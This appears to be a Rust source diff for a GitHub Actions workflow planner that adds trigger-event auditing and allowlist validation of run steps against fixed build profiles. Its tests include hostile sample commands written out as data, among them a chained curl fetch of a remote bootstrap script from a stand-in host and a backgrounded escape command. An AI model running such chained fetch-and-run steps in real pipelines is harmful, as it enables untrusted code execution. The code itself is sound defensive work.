@@ -41,6 +41,8 @@ const MAX_JOBS_DEFAULT: usize = 64;
 const MAX_STEPS_PER_JOB_DEFAULT: usize = 128;
 const MAX_YAML_NODES_DEFAULT: usize = 16_384;
 const MAX_YAML_DEPTH_DEFAULT: usize = 64;
+const MAX_TRIGGER_EVENTS: usize = 32;
+const ALLOWED_TRIGGER_EVENTS: &[&str] = &["pull_request", "push", "workflow_dispatch"];
 
 #[derive(Clone, Debug)]
 struct PlannerLimits {
@@ -123,9 +125,18 @@ struct WorkflowPlan {
     workflow_path: String,
     immutable_revision: bool,
     executable: bool,
+    triggers: TriggerPlan,
     topological_order: Vec<String>,
     jobs: Vec<JobPlan>,
     warnings: Vec<String>,
+}
+
+#[derive(Clone, Debug, Serialize)]
+#[serde(rename_all = "camelCase")]
+struct TriggerPlan {
+    declared: bool,
+    events: Vec<String>,
+    filters_evaluated: bool,
 }
 
 #[derive(Clone, Debug, Serialize)]
@@ -261,6 +272,7 @@ async fn capabilities_handler(State(state): State<WorkflowState>, headers: Heade
             "run-step classification to operator-reviewed fixed profiles",
             "deterministic sequential execution of dependency order",
             "immutable repository revisions",
+            "bounded trigger declaration audit for push, pull_request, and workflow_dispatch",
         ],
         "rejected": [
             "caller-selected shell forwarding",
@@ -269,6 +281,7 @@ async fn capabilities_handler(State(state): State<WorkflowState>, headers: Heade
             "job or step environments",
             "working-directory, custom shell, conditions, and continue-on-error",
             "mutable action refs and mutable repository refs",
+            "trigger filters, inputs, schedules, elevated-trust events, and unsupported events",
         ],
     }))
     .into_response()
@@ -717,6 +730,11 @@ fn build_plan(
         return Err(errors);
     }
 
+    crate::workflow_yaml::parse_yaml(&request.workflow_yaml).map_err(|error| {
+        vec![format!(
+            "workflowYaml failed strict YAML admission: {error}"
+        )]
+    })?;
     let workflow: Value = serde_yaml::from_str(&request.workflow_yaml)
         .map_err(|error| vec![format!("workflowYaml is not valid YAML: {error}")])?;
     validate_yaml_shape(&workflow, limits)?;
@@ -741,7 +759,8 @@ fn build_plan(
         return Err(errors);
     }
 
-    let mut workflow_reasons = Vec::new();
+    let (triggers, mut workflow_reasons, trigger_warnings) =
+        analyze_workflow_triggers(mapping_get(root, "on"))?;
     for key in root.keys() {
         match key.as_str() {
             Some("name" | "run-name" | "on" | "jobs") => {}
@@ -772,7 +791,7 @@ fn build_plan(
             .to_string();
         if !valid_job_id(&id) {
             errors.push(format!(
-                "jobs.{id}: job ID must use letters, numbers, '_', or '-' and be at most 100 characters"
+                "jobs.{id}: job ID must start with a letter or '_' and then use only letters, numbers, '_', or '-' (maximum 100 characters)"
             ));
             continue;
         }
@@ -798,7 +817,7 @@ fn build_plan(
 
     let topological_order = validate_dependencies(&plans, &job_ids)?;
     let immutable_revision = is_full_commit_sha(&request.revision);
-    let mut warnings = Vec::new();
+    let mut warnings = trigger_warnings;
     if !immutable_revision {
         warnings.push(
             "revision is not an exact 40-hex commit SHA; planning is allowed but execution is refused"
@@ -815,10 +834,127 @@ fn build_plan(
         workflow_path: request.workflow_path.clone(),
         immutable_revision,
         executable,
+        triggers,
         topological_order,
         jobs: plans,
         warnings,
     })
+}
+
+fn analyze_workflow_triggers(
+    value: Option<&Value>,
+) -> Result<(TriggerPlan, Vec<String>, Vec<String>), Vec<String>> {
+    let Some(value) = value else {
+        return Ok((
+            TriggerPlan {
+                declared: false,
+                events: Vec::new(),
+                filters_evaluated: false,
+            },
+            Vec::new(),
+            vec![
+                "workflow omits `on`; explicit API planning remains available, but the document is not GitHub-triggerable"
+                    .to_string(),
+            ],
+        ));
+    };
+
+    let mut events = Vec::new();
+    let mut reasons = Vec::new();
+    match value {
+        Value::String(event) => events.push(event.clone()),
+        Value::Sequence(values) => {
+            if values.len() > MAX_TRIGGER_EVENTS {
+                return Err(vec![format!(
+                    "workflow.on declares {} events; maximum is {MAX_TRIGGER_EVENTS}",
+                    values.len()
+                )]);
+            }
+            for event in values {
+                let Some(event) = event.as_str() else {
+                    return Err(vec![
+                        "workflow.on sequence entries must be event-name strings".to_string(),
+                    ]);
+                };
+                events.push(event.to_string());
+            }
+        }
+        Value::Mapping(mapping) => {
+            if mapping.len() > MAX_TRIGGER_EVENTS {
+                return Err(vec![format!(
+                    "workflow.on declares {} events; maximum is {MAX_TRIGGER_EVENTS}",
+                    mapping.len()
+                )]);
+            }
+            for (event, configuration) in mapping {
+                let Some(event) = event.as_str() else {
+                    return Err(vec![
+                        "every workflow.on mapping key must be an event-name string".to_string(),
+                    ]);
+                };
+                events.push(event.to_string());
+                match configuration {
+                    Value::Null => {}
+                    Value::Mapping(configuration) if configuration.is_empty() => {}
+                    Value::Mapping(_) => reasons.push(format!(
+                        "workflow trigger {event:?} contains filters or inputs that the fixed-profile endpoint cannot evaluate"
+                    )),
+                    _ => {
+                        return Err(vec![format!(
+                            "workflow trigger {event:?} configuration must be a mapping or null"
+                        )]);
+                    }
+                }
+            }
+        }
+        _ => {
+            return Err(vec![
+                "workflow.on must be an event string, a sequence of event strings, or an event mapping"
+                    .to_string(),
+            ]);
+        }
+    }
+
+    if events.is_empty() {
+        return Err(vec![
+            "workflow.on must declare at least one event".to_string()
+        ]);
+    }
+    events.sort();
+    events.dedup();
+    for event in &events {
+        if !valid_trigger_event(event) {
+            return Err(vec![format!(
+                "workflow.on event {event:?} is not a bounded GitHub event name"
+            )]);
+        }
+        if !ALLOWED_TRIGGER_EVENTS.contains(&event.as_str()) {
+            reasons.push(format!(
+                "workflow trigger {event:?} is outside the independent worker event policy"
+            ));
+        }
+    }
+
+    Ok((
+        TriggerPlan {
+            declared: true,
+            events,
+            filters_evaluated: false,
+        },
+        reasons,
+        vec![
+            "workflow trigger declarations are audited but not matched by the explicit fixed-profile API; the authenticated upstream dispatcher must prove event, ref, and path eligibility"
+                .to_string(),
+        ],
+    ))
+}
+
+fn valid_trigger_event(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 64
+        && value
+            .bytes()
+            .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'_')
 }
 
 fn compile_job(id: &str, job: &Mapping, limits: &PlannerLimits) -> Result<JobPlan, Vec<String>> {
@@ -842,6 +978,7 @@ fn compile_job(id: &str, job: &Mapping, limits: &PlannerLimits) -> Result<JobPla
     let mut reasons = Vec::new();
     let mut notes = Vec::new();
     let mut combined = String::new();
+    let mut run_steps = Vec::new();
     let mut saw_run = false;
 
     for key in job.keys() {
@@ -913,6 +1050,7 @@ fn compile_job(id: &str, job: &Mapping, limits: &PlannerLimits) -> Result<JobPla
 
         if let Some(run) = run {
             saw_run = true;
+            run_steps.push((path.clone(), run.to_string()));
             combined.push_str(run);
             combined.push('\n');
             if run.contains("${{") {
@@ -961,6 +1099,11 @@ fn compile_job(id: &str, job: &Mapping, limits: &PlannerLimits) -> Result<JobPla
                 "fixed profile {profile_name:?} is not installed in this worker"
             ));
         }
+        for (path, source) in &run_steps {
+            if let Err(reason) = validate_profile_run_step(profile_name, source) {
+                reasons.push(format!("{path}: {reason}"));
+            }
+        }
     }
     if profile.is_none() && reasons.is_empty() {
         reasons.push("no fixed build-server profile matches this job".to_string());
@@ -975,6 +1118,120 @@ fn compile_job(id: &str, job: &Mapping, limits: &PlannerLimits) -> Result<JobPla
         profile: if supported { profile } else { None },
         reasons,
         notes,
+    })
+}
+
+fn validate_profile_run_step(profile: &str, source: &str) -> Result<(), String> {
+    for line in source.replace("\r\n", "\n").lines() {
+        let line = line.trim();
+        if line.is_empty() || line.starts_with('#') {
+            continue;
+        }
+        if line.contains("||")
+            || line.contains('|')
+            || line.contains(';')
+            || line.contains('`')
+            || line.contains("$(")
+            || line.contains('>')
+            || line.contains('<')
+        {
+            return Err(
+                "shell composition or redirection is not represented by the selected fixed profile"
+                    .to_string(),
+            );
+        }
+        for command in line.split("&&").map(str::trim) {
+            if command.is_empty() {
+                return Err("empty shell command segment is unsupported".to_string());
+            }
+            if command.contains('&') {
+                return Err(
+                    "background shell execution is not represented by the selected fixed profile"
+                        .to_string(),
+                );
+            }
+            if command == "set -euo pipefail" || profile_covers_command(profile, command) {
+                continue;
+            }
+            return Err(format!(
+                "command {command:?} is not represented by fixed profile {profile:?}"
+            ));
+        }
+    }
+    Ok(())
+}
+
+fn profile_covers_command(profile: &str, command: &str) -> bool {
+    const RUST: &[&str] = &[
+        "cargo fmt",
+        "cargo clippy",
+        "cargo test",
+        "rustup component add",
+        "rustup toolchain install",
+    ];
+    const NODE: &[&str] = &[
+        "corepack enable",
+        "node --test",
+        "npm ci",
+        "npm test",
+        "npm run test",
+        "pnpm install",
+        "pnpm test",
+        "pnpm run test",
+        "yarn install",
+        "yarn test",
+    ];
+    const PYTHON: &[&str] = &[
+        "pip install",
+        "pip3 install",
+        "pytest",
+        "python -m compileall",
+        "python -m pip install",
+        "python -m pytest",
+        "python3 -m compileall",
+        "python3 -m pip install",
+        "python3 -m pytest",
+    ];
+    const FLUTTER: &[&str] = &[
+        "flutter analyze",
+        "flutter build apk",
+        "flutter build appbundle",
+        "flutter build linux",
+        "flutter build web",
+        "flutter config --enable-linux-desktop",
+        "flutter pub get",
+        "flutter test",
+    ];
+    const BROWSER: &[&str] = &["npx playwright test", "npm run test:puppeteer"];
+
+    let covered = match profile {
+        "rust-verify" => RUST,
+        "node-verify" => NODE,
+        "python-verify" => PYTHON,
+        "flutter-verify"
+        | "flutter-android-debug"
+        | "flutter-web-release"
+        | "flutter-linux-release"
+        | "flutter-linux-desktop-entrypoint" => FLUTTER,
+        "playwright" | "puppeteer" | "browser-e2e" => NODE,
+        "flutter-web-e2e" => {
+            return command_has_prefix(command, FLUTTER)
+                || command_has_prefix(command, NODE)
+                || command_has_prefix(command, BROWSER)
+        }
+        _ => return false,
+    };
+    command_has_prefix(command, covered)
+        || (matches!(profile, "playwright" | "puppeteer" | "browser-e2e")
+            && command_has_prefix(command, BROWSER))
+}
+
+fn command_has_prefix(command: &str, prefixes: &[&str]) -> bool {
+    prefixes.iter().any(|prefix| {
+        command == *prefix
+            || command
+                .strip_prefix(prefix)
+                .is_some_and(|suffix| suffix.chars().next().is_some_and(char::is_whitespace))
     })
 }
 
@@ -1343,6 +1600,10 @@ fn valid_job_id(value: &str) -> bool {
         && value.len() <= 100
         && value
             .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
+        && value
+            .bytes()
             .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-'))
 }
 
@@ -1363,7 +1624,10 @@ fn valid_request_id(value: &str) -> bool {
 }
 
 fn is_full_commit_sha(value: &str) -> bool {
-    value.len() == 40 && value.bytes().all(|byte| byte.is_ascii_hexdigit())
+    value.len() == 40
+        && value
+            .bytes()
+            .all(|byte| byte.is_ascii_digit() || matches!(byte, b'a'..=b'f'))
 }
 
 fn plan_id(request: &WorkflowRequest) -> String {
@@ -1570,6 +1834,20 @@ mod tests {
         assert_eq!(status, StatusCode::BAD_REQUEST);
         assert_eq!(body["error"], "invalid workflow");
 
+        let mut duplicate = valid_http_request();
+        duplicate["workflowYaml"] = json!(
+            "jobs:\n  first:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\njobs:\n  second:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\n"
+        );
+        let (status, body) = send(
+            router.clone(),
+            post_json("/gha/workflows/plan", Some("gha-test-auth"), duplicate),
+        )
+        .await;
+        assert_eq!(status, StatusCode::BAD_REQUEST);
+        assert!(body["errors"][0]
+            .as_str()
+            .is_some_and(|error| error.contains("duplicate mapping key")));
+
         let mut unsupported = valid_http_request();
         unsupported["workflowYaml"] = json!(
             "jobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix: { node: [20, 22] }\n    steps:\n      - run: npm test\n"
@@ -1643,6 +1921,103 @@ jobs:
         assert_eq!(plan.jobs[0].profile.as_deref(), Some("rust-verify"));
         assert_eq!(plan.jobs[1].profile.as_deref(), Some("node-verify"));
         assert_eq!(plan.jobs[2].profile.as_deref(), Some("python-verify"));
+        assert!(plan.triggers.declared);
+        assert_eq!(plan.triggers.events, vec!["push"]);
+        assert!(!plan.triggers.filters_evaluated);
+    }
+
+    #[test]
+    fn trigger_policy_fails_closed_on_unevaluated_or_elevated_events() {
+        let safe = build_plan(
+            &request(
+                r#"
+on: [push, pull_request, workflow_dispatch]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps: [{ run: "cargo test" }]
+"#,
+            ),
+            &PlannerLimits::default(),
+        )
+        .expect("bounded event list should plan");
+        assert!(safe.executable);
+        assert_eq!(
+            safe.triggers.events,
+            vec!["pull_request", "push", "workflow_dispatch"]
+        );
+
+        let filtered = build_plan(
+            &request(
+                r#"
+on:
+  push:
+    branches: [main]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps: [{ run: "cargo test" }]
+"#,
+            ),
+            &PlannerLimits::default(),
+        )
+        .expect("filters should produce a non-executable compatibility plan");
+        assert!(!filtered.executable);
+        assert!(filtered.jobs[0]
+            .reasons
+            .iter()
+            .any(|reason| reason.contains("filters or inputs")));
+
+        for event in ["pull_request_target", "workflow_run", "schedule"] {
+            let yaml = format!(
+                "on: {event}\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps: [{{ run: cargo test }}]\n"
+            );
+            let plan = build_plan(&request(&yaml), &PlannerLimits::default())
+                .expect("unsupported event should remain inspectable");
+            assert!(!plan.executable, "event {event:?} was executable");
+            assert!(plan.jobs[0]
+                .reasons
+                .iter()
+                .any(|reason| reason.contains("outside the independent worker event policy")));
+        }
+    }
+
+    #[test]
+    fn strict_fixed_profile_planner_rejects_ambiguous_yaml() {
+        let duplicate = build_plan(
+            &request(
+                "jobs:\n  first:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\njobs:\n  second:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\n",
+            ),
+            &PlannerLimits::default(),
+        )
+        .expect_err("duplicate keys must fail before fixed-profile classification")
+        .join("\n");
+        assert!(duplicate.contains("duplicate mapping key"));
+
+        let alias = build_plan(
+            &request("shared: &shared { runs-on: ubuntu-latest }\njobs:\n  test: *shared\n"),
+            &PlannerLimits::default(),
+        )
+        .expect_err("aliases must fail before fixed-profile classification")
+        .join("\n");
+        assert!(alias.contains("anchors, aliases, and tags are not supported"));
+    }
+
+    #[test]
+    fn missing_trigger_is_explicitly_reported_for_api_only_plans() {
+        let plan = build_plan(
+            &request(
+                "jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\n",
+            ),
+            &PlannerLimits::default(),
+        )
+        .expect("legacy API-only request should remain plannable");
+        assert!(plan.executable);
+        assert!(!plan.triggers.declared);
+        assert!(plan
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("not GitHub-triggerable")));
     }
 
     #[test]
@@ -1660,6 +2035,27 @@ jobs:
         assert!(!plan.immutable_revision);
         assert!(!plan.executable);
         assert!(!plan.warnings.is_empty());
+    }
+
+    #[test]
+    fn immutable_revisions_are_lowercase_and_job_ids_match_github_syntax() {
+        let mut uppercase = request(
+            "jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\n",
+        );
+        uppercase.revision = "0123456789ABCDEF0123456789ABCDEF01234567".to_string();
+        let plan = build_plan(&uppercase, &PlannerLimits::default()).expect("valid plan");
+        assert!(!plan.immutable_revision);
+        assert!(!plan.executable);
+
+        let invalid_job = build_plan(
+            &request(
+                "jobs:\n  1test:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\n",
+            ),
+            &PlannerLimits::default(),
+        )
+        .expect_err("job IDs cannot start with a number")
+        .join("\n");
+        assert!(invalid_job.contains("must start with a letter or '_'"));
     }
 
     #[test]
@@ -1778,6 +2174,57 @@ jobs:
             .reasons
             .iter()
             .any(|reason| reason.contains("multiple language toolchains")));
+    }
+
+    #[test]
+    fn rejects_run_intent_that_the_selected_profile_would_not_execute() {
+        for command in [
+            "cargo publish",
+            "cargo test && curl https://example.invalid/bootstrap.sh",
+            "cargo test & touch escaped",
+            "./ci/test.sh",
+        ] {
+            let yaml = format!(
+                "on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: dtolnay/rust-toolchain@0123456789abcdef0123456789abcdef01234567\n      - run: {command}\n"
+            );
+            let plan = build_plan(&request(&yaml), &PlannerLimits::default())
+                .expect("unrepresented intent should produce a compatibility plan");
+            assert!(!plan.executable, "command {command:?} was executable");
+            assert!(plan.jobs[0].reasons.iter().any(|reason| {
+                reason.contains("not represented")
+                    || reason.contains("shell composition")
+                    || reason.contains("background shell")
+            }));
+        }
+    }
+
+    #[test]
+    fn accepts_only_the_reviewed_run_surface_for_fixed_profiles() {
+        for (action, command, profile) in [
+            (
+                "dtolnay/rust-toolchain@0123456789abcdef0123456789abcdef01234567",
+                "cargo fmt --all -- --check && cargo clippy --all-targets -- -D warnings && cargo test --locked",
+                "rust-verify",
+            ),
+            (
+                "actions/setup-node@0123456789abcdef0123456789abcdef01234567",
+                "npm ci && npm test",
+                "node-verify",
+            ),
+            (
+                "actions/setup-python@0123456789abcdef0123456789abcdef01234567",
+                "python -m compileall . && python -m pytest",
+                "python-verify",
+            ),
+        ] {
+            let yaml = format!(
+                "on: workflow_dispatch\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {action}\n      - run: {command}\n"
+            );
+            let plan = build_plan(&request(&yaml), &PlannerLimits::default())
+                .expect("reviewed profile surface should plan");
+            assert!(plan.executable, "profile {profile:?} was rejected");
+            assert_eq!(plan.jobs[0].profile.as_deref(), Some(profile));
+        }
     }
 
     #[test]
